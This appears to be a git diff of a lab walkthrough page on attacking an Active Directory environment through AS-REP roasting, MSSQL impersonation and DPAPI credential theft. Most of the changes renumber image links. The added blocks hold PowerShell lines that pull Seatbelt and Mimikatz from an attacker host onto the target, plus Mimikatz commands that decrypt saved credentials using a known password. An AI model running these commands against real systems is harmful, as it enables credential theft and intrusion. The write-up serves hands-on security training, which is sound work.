@@ -63,7 +63,7 @@ Other attacks which are possible to do is password spraying or checking if the u
 GetNPUsers.py amsterdam/ -dc-ip 10.0.0.3 -usersfile users.txt -format hashcat -outputfile asreproasting.txt
 ```
 
-![](<../../../../.gitbook/assets/image (9) (1).png>)
+![](<../../../../.gitbook/assets/image (9) (1) (1).png>)
 
 2\. The output doesn't show us any successes. But the file `kerberoasting.txt` is there and it has a hash:
 
@@ -156,7 +156,7 @@ Richard can connect to the SQL server running on `WEB01` `10.0.0.5`. But he isn'
 mssqlclient.py -windows-auth 'amsterdam/richard:Sample123'@10.0.0.5
 ```
 
-![](<../../../../.gitbook/assets/image (9).png>)
+![](<../../../../.gitbook/assets/image (9) (1).png>)
 
 ### 4. Become sysadmin
 
@@ -221,7 +221,7 @@ ON a.grantor_principal_id = b.principal_id
 WHERE a.permission_name = 'IMPERSONATE'
 ```
 
-![](<../../../../.gitbook/assets/image (20).png>)
+![](<../../../../.gitbook/assets/image (20) (1).png>)
 
 5\. We can now try to impersonate `sa`, but we get an error:
 
@@ -294,7 +294,7 @@ Now we can try to execute the whoami command again and it worked:
 * Start a webserver on port 8090: `python3 -m http.server 8090`
 * Start a listener on port 443: `nc -lvp 443`
 
-![](<../../../../.gitbook/assets/image (35).png>)
+![](<../../../../.gitbook/assets/image (35) (1).png>)
 
 4\. Now we need to change/type the payload we want to execute on the sql server. A method I learned to use is base64 encode the command we want to execute and use the -enc parameter inside PowerShell. This prevents a lot of issues with single and double qoutes.
 
@@ -767,9 +767,11 @@ crackmapexec smb 10.0.0.101 -u administrator -H a59cc2e81b2835c6b402634e584a8edc
 
 **Task: Look for saved credentials on the machine (DPAPI).**
 
-1. One of the things I like to do when gaining access to a system is running [Seatbelt](https://github.com/GhostPack/Seatbelt). This tool will check many things like permissions, groups and for stored credentials. To run Seatbelt and do some of it checks we can run the following command:
+1. One of the things I like to do when gaining access to a system is running [Seatbelt](https://github.com/GhostPack/Seatbelt). This tool will check many things like permissions, groups and for stored credentials. First we need to download Seatbelt.exe on the target and then run Seatbelt:
 
 ```
+$WebClient = New-Object System.Net.WebClient
+$WebClient.DownloadFile("http://192.168.248.2:8090/Seatbelt.exe","C:\users\public\Seatbelt.exe") 
 .\Seatbelt.exe --group=user
 ```
 
@@ -778,6 +780,36 @@ crackmapexec smb 10.0.0.101 -u administrator -H a59cc2e81b2835c6b402634e584a8edc
 ![](<../../../../.gitbook/assets/image (17).png>)
 
 4\. We can find the master encryption key id and some information about the saved credentials with the following Mimikatz command using the previous path and FileName:
+
+```
+$WebClient = New-Object System.Net.WebClient
+$WebClient.DownloadFile("http://192.168.248.2:8090/mimikatz.exe","C:\users\public\mimikatz.exe") 
+./mimikatz.exe "dpapi::cred /in:C:\Users\sa_sql\AppData\Roaming\Microsoft\Credentials\02BF8752741C7A447536E822E53153CD" "exit"
+```
+
+{% hint style="info" %}
+The latest compiled version of Mimikatz doesn't work on server 2022. Compiling the latest commit with Visual Studio 2019 gave me some errors, but this [https://github.com/matrix/mimikatz/tree/type\_cast-pointer\_truncation\_x64](https://github.com/matrix/mimikatz/tree/type\_cast-pointer\_truncation\_x64) repostorie/pull request worked for me without errors! I really hate compiling tools like this, always errors :cry:
+{% endhint %}
+
+![](<../../../../.gitbook/assets/image (20).png>)
+
+The `pbData` field contains the encrypted data and the `guidMasterKey` contains the GUID of the key needed to decrypt it.
+
+5\. The next step is to retrieve the masterkey with the password of the user. Luckily we already know the password of the `sa_sql` user, which is `Iloveyou2`. With the following Mimikatz command we can retrieve the masterkey:
+
+```
+./mimikatz.exe "dpapi::masterkey /in:C:\Users\sa_sql\AppData\Roaming\Microsoft\Protect\S-1-5-21-1498997062-1091976085-892328878-1106\e1f462bb-9a65-40f0-a144-4f64bea97ce2 /sid:S-1-5-21-1498997062-1091976085-892328878-1106 /password:Iloveyou2 /protected" "exit"
+```
+
+For some reason I kept getting errors, even If I gained a shell as `sa_sql` through crackmapexec. We already owned the machine so maybe we could just RDP into it. But RDP is disabled:
+
+![](<../../../../.gitbook/assets/image (35).png>)
+
+
+
+
+
+
 
 
 
